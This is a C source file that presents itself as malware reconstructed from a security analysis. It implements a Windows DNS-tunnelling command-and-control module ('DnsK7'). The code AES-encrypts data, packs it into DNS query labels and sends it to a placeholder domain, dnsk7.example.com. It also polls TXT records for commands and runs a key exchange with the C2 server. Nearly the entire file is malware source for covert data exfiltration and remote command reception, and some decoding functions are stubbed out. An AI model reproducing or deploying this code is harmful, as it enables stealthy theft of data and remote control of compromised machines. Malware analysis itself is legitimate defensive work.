/**
 * PE #2 - DNS Tunneling Module (DnsK7)
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module implements DNS-based C2 communication.
 * Uses TXT records for data exfiltration and command reception.
 * 
 * Key findings from analysis:
 * - String "DnsK7" found at offset 0x15b5b
 * - Uses AES-256-CBC for payload encryption
 * - Supports dynamic key exchange via DNS
 */

#include <windows.h>
#include <windns.h>
#include <wincrypt.h>

#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "crypt32.lib")

//=============================================================================
// CONFIGURATION
//=============================================================================

// DNS configuration
#define DNS_TUNNEL_DOMAIN       L"dnsk7.example.com"
#define DNS_MAX_LABEL_SIZE      63
#define DNS_MAX_QUERY_SIZE      253
#define DNS_BEACON_PREFIX       L"b"
#define DNS_DATA_PREFIX         L"d"
#define DNS_ACK_PREFIX          L"a"

// AES configuration
#define AES_KEY_SIZE            32      // AES-256
#define AES_BLOCK_SIZE          16
#define AES_IV_SIZE             16

//=============================================================================
// STRUCTURES
//=============================================================================

typedef struct _DNS_TUNNEL_SESSION {
    BYTE    SessionKey[AES_KEY_SIZE];
    BYTE    CurrentIV[AES_IV_SIZE];
    DWORD   SequenceNumber;
    WCHAR   Domain[256];
    BOOL    Initialized;
} DNS_TUNNEL_SESSION, *PDNS_TUNNEL_SESSION;

typedef struct _DNS_PACKET {
    BYTE    Type;           // 'B'eacon, 'D'ata, 'A'ck
    DWORD   Sequence;
    WORD    Length;
    BYTE    Data[1];        // Variable length
} DNS_PACKET, *PDNS_PACKET;

//=============================================================================
// GLOBALS
//=============================================================================

static DNS_TUNNEL_SESSION g_Session = {0};
static HCRYPTPROV g_hCryptProv = 0;
static HCRYPTKEY g_hAESKey = 0;

//=============================================================================
// BASE64 ENCODING
//=============================================================================

static const char g_Base64Table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

/**
 * Encode binary data to DNS-safe base64.
 */
static DWORD 
Base64Encode(
    PBYTE Input,
    DWORD InputSize,
    PCHAR Output,
    DWORD OutputSize
)
{
    DWORD i, j;
    DWORD val;
    
    if (OutputSize < ((InputSize + 2) / 3 * 4 + 1)) {
        return 0;
    }
    
    for (i = 0, j = 0; i < InputSize;) {
        val = Input[i++] << 16;
        if (i < InputSize) val |= Input[i++] << 8;
        if (i < InputSize) val |= Input[i++];
        
        Output[j++] = g_Base64Table[(val >> 18) & 0x3F];
        Output[j++] = g_Base64Table[(val >> 12) & 0x3F];
        Output[j++] = (i > InputSize + 1) ? '=' : g_Base64Table[(val >> 6) & 0x3F];
        Output[j++] = (i > InputSize) ? '=' : g_Base64Table[val & 0x3F];
    }
    
    Output[j] = '\0';
    return j;
}

/**
 * Decode DNS-safe base64 to binary.
 */
static DWORD 
Base64Decode(
    PCHAR Input,
    PBYTE Output,
    DWORD OutputSize
)
{
    // Implementation omitted for brevity
    return 0;
}

//=============================================================================
// AES-256-CBC ENCRYPTION
//=============================================================================

/**
 * Initialize AES encryption.
 */
static BOOL 
AES_Initialize(
    PBYTE Key,
    DWORD KeySize
)
{
    struct {
        BLOBHEADER header;
        DWORD keySize;
        BYTE keyData[AES_KEY_SIZE];
    } keyBlob;
    
    if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, 
                               PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // Build key blob
    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = KeySize;
    CopyMemory(keyBlob.keyData, Key, KeySize);
    
    if (!CryptImportKey(g_hCryptProv, (PBYTE)&keyBlob, 
                        sizeof(keyBlob), 0, 0, &g_hAESKey)) {
        CryptReleaseContext(g_hCryptProv, 0);
        return FALSE;
    }
    
    // Set CBC mode
    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(g_hAESKey, KP_MODE, (PBYTE)&mode, 0);
    
    return TRUE;
}

/**
 * AES-256-CBC encrypt.
 */
static BOOL 
AES_Encrypt(
    PBYTE Plaintext,
    DWORD PlaintextSize,
    PBYTE IV,
    PBYTE Ciphertext,
    PDWORD CiphertextSize
)
{
    DWORD dataLen = PlaintextSize;
    
    // Set IV
    CryptSetKeyParam(g_hAESKey, KP_IV, IV, 0);
    
    // Copy plaintext to output buffer
    CopyMemory(Ciphertext, Plaintext, PlaintextSize);
    
    // Encrypt (with padding)
    if (!CryptEncrypt(g_hAESKey, 0, TRUE, 0, Ciphertext, &dataLen, *CiphertextSize)) {
        return FALSE;
    }
    
    *CiphertextSize = dataLen;
    return TRUE;
}

/**
 * AES-256-CBC decrypt.
 */
static BOOL 
AES_Decrypt(
    PBYTE Ciphertext,
    DWORD CiphertextSize,
    PBYTE IV,
    PBYTE Plaintext,
    PDWORD PlaintextSize
)
{
    DWORD dataLen = CiphertextSize;
    
    // Set IV
    CryptSetKeyParam(g_hAESKey, KP_IV, IV, 0);
    
    // Copy ciphertext to output buffer
    CopyMemory(Plaintext, Ciphertext, CiphertextSize);
    
    // Decrypt (removes padding)
    if (!CryptDecrypt(g_hAESKey, 0, TRUE, 0, Plaintext, &dataLen)) {
        return FALSE;
    }
    
    *PlaintextSize = dataLen;
    return TRUE;
}

//=============================================================================
// DNS OPERATIONS
//=============================================================================

/**
 * Build DNS query name from data.
 * 
 * Format: <base64-encoded-data>.<prefix>.<domain>
 */
static BOOL 
BuildDnsQuery(
    PBYTE Data,
    DWORD DataSize,
    LPCWSTR Prefix,
    PWCHAR QueryName,
    DWORD QueryNameSize
)
{
    CHAR encoded[256];
    WCHAR encodedW[256];
    
    // Base64 encode data
    Base64Encode(Data, DataSize, encoded, sizeof(encoded));
    
    // Convert to wide string
    MultiByteToWideChar(CP_UTF8, 0, encoded, -1, encodedW, 256);
    
    // Build query name
    swprintf_s(QueryName, QueryNameSize, L"%s.%s.%s",
        encodedW, Prefix, g_Session.Domain);
    
    return TRUE;
}

/**
 * Send DNS query and get response.
 */
static BOOL 
DnsQuery_Tunnel(
    LPCWSTR QueryName,
    PBYTE* ResponseData,
    PDWORD ResponseSize
)
{
    DNS_STATUS status;
    PDNS_RECORD pRecords = NULL;
    PDNS_RECORD pRecord;
    PBYTE response = NULL;
    DWORD responseLen = 0;
    
    // Query TXT records
    status = DnsQuery_W(
        QueryName,
        DNS_TYPE_TEXT,
        DNS_QUERY_STANDARD | DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pRecords,
        NULL
    );
    
    if (status != ERROR_SUCCESS) {
        return FALSE;
    }
    
    // Process TXT records
    for (pRecord = pRecords; pRecord != NULL; pRecord = pRecord->pNext) {
        if (pRecord->wType == DNS_TYPE_TEXT) {
            // TXT record contains base64-encoded response
            DWORD strCount = pRecord->Data.TXT.dwStringCount;
            
            for (DWORD i = 0; i < strCount; i++) {
                LPWSTR str = pRecord->Data.TXT.pStringArray[i];
                // Decode and append to response
                // (Implementation simplified)
            }
        }
    }
    
    DnsRecordListFree(pRecords, DnsFreeRecordList);
    
    if (ResponseData && ResponseSize) {
        *ResponseData = response;
        *ResponseSize = responseLen;
    }
    
    return (responseLen > 0);
}

//=============================================================================
// KEY EXCHANGE
//=============================================================================

/**
 * Perform key exchange with C2.
 * 
 * Protocol:
 * 1. Client generates random 32 bytes
 * 2. Sends via DNS: <random>.<keyexchange>.<domain>
 * 3. Server responds with encrypted AES key in TXT record
 * 4. Client derives session key from randoms
 */
static BOOL 
DnsTunnel_KeyExchange(VOID)
{
    BYTE clientRandom[32];
    BYTE serverRandom[32];
    WCHAR queryName[512];
    PBYTE response = NULL;
    DWORD responseSize = 0;
    
    // Generate client random
    if (!CryptGenRandom(g_hCryptProv, 32, clientRandom)) {
        return FALSE;
    }
    
    // Build key exchange query
    BuildDnsQuery(clientRandom, 32, L"kex", queryName, 512);
    
    // Send query
    if (!DnsQuery_Tunnel(queryName, &response, &responseSize)) {
        return FALSE;
    }
    
    // Decode server random from response
    if (responseSize < 32) {
        HeapFree(GetProcessHeap(), 0, response);
        return FALSE;
    }
    
    CopyMemory(serverRandom, response, 32);
    HeapFree(GetProcessHeap(), 0, response);
    
    // Derive session key: SHA256(clientRandom || serverRandom)
    HCRYPTHASH hHash;
    DWORD keyLen = AES_KEY_SIZE;
    
    CryptCreateHash(g_hCryptProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, clientRandom, 32, 0);
    CryptHashData(hHash, serverRandom, 32, 0);
    CryptGetHashParam(hHash, HP_HASHVAL, g_Session.SessionKey, &keyLen, 0);
    CryptDestroyHash(hHash);
    
    // Initialize AES with derived key
    AES_Initialize(g_Session.SessionKey, AES_KEY_SIZE);
    
    g_Session.Initialized = TRUE;
    return TRUE;
}

//=============================================================================
// DATA TRANSMISSION
//=============================================================================

/**
 * Send data over DNS tunnel.
 */
BOOL 
DnsTunnel_Send(
    PBYTE Data,
    DWORD DataSize
)
{
    BYTE encrypted[4096];
    DWORD encryptedSize = sizeof(encrypted);
    BYTE iv[AES_IV_SIZE];
    WCHAR queryName[512];
    PBYTE response = NULL;
    DWORD responseSize = 0;
    
    if (!g_Session.Initialized) {
        if (!DnsTunnel_KeyExchange()) {
            return FALSE;
        }
    }
    
    // Generate random IV
    CryptGenRandom(g_hCryptProv, AES_IV_SIZE, iv);
    
    // Encrypt data
    if (!AES_Encrypt(Data, DataSize, iv, encrypted, &encryptedSize)) {
        return FALSE;
    }
    
    // Send in chunks (DNS label size limit)
    DWORD offset = 0;
    DWORD chunkSize;
    
    while (offset < encryptedSize) {
        chunkSize = min(DNS_MAX_LABEL_SIZE * 3 / 4, encryptedSize - offset);
        
        // Build and send chunk
        BuildDnsQuery(encrypted + offset, chunkSize, DNS_DATA_PREFIX, 
                      queryName, 512);
        
        DnsQuery_Tunnel(queryName, &response, &responseSize);
        
        if (response) {
            HeapFree(GetProcessHeap(), 0, response);
        }
        
        offset += chunkSize;
        g_Session.SequenceNumber++;
    }
    
    return TRUE;
}

/**
 * Receive data from DNS tunnel (poll).
 */
BOOL 
DnsTunnel_Receive(
    PBYTE* Data,
    PDWORD DataSize
)
{
    BYTE beacon[16];
    WCHAR queryName[512];
    PBYTE response = NULL;
    DWORD responseSize = 0;
    BYTE decrypted[4096];
    DWORD decryptedSize = sizeof(decrypted);
    
    if (!g_Session.Initialized) {
        return FALSE;
    }
    
    // Build beacon query
    *(DWORD*)beacon = g_Session.SequenceNumber;
    BuildDnsQuery(beacon, 4, DNS_BEACON_PREFIX, queryName, 512);
    
    // Send beacon
    if (!DnsQuery_Tunnel(queryName, &response, &responseSize)) {
        return FALSE;
    }
    
    if (responseSize == 0) {
        // No pending data
        return FALSE;
    }
    
    // Decrypt response
    if (!AES_Decrypt(response, responseSize, g_Session.CurrentIV, 
                     decrypted, &decryptedSize)) {
        HeapFree(GetProcessHeap(), 0, response);
        return FALSE;
    }
    
    HeapFree(GetProcessHeap(), 0, response);
    
    // Allocate and copy result
    *Data = (PBYTE)HeapAlloc(GetProcessHeap(), 0, decryptedSize);
    if (*Data == NULL) {
        return FALSE;
    }
    
    CopyMemory(*Data, decrypted, decryptedSize);
    *DataSize = decryptedSize;
    
    return TRUE;
}

//=============================================================================
// INITIALIZATION
//=============================================================================

/**
 * Initialize DNS tunnel module.
 */
BOOL 
DnsTunnel_Initialize(
    LPCWSTR Domain
)
{
    wcscpy_s(g_Session.Domain, 256, Domain);
    g_Session.SequenceNumber = GetTickCount();
    g_Session.Initialized = FALSE;
    
    // Initialize crypto
    if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, 
                               PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // Perform key exchange
    return DnsTunnel_KeyExchange();
}

/**
 * Cleanup DNS tunnel module.
 */
VOID 
DnsTunnel_Cleanup(VOID)
{
    if (g_hAESKey) {
        CryptDestroyKey(g_hAESKey);
    }
    if (g_hCryptProv) {
        CryptReleaseContext(g_hCryptProv, 0);
    }
    
    SecureZeroMemory(&g_Session, sizeof(g_Session));
}
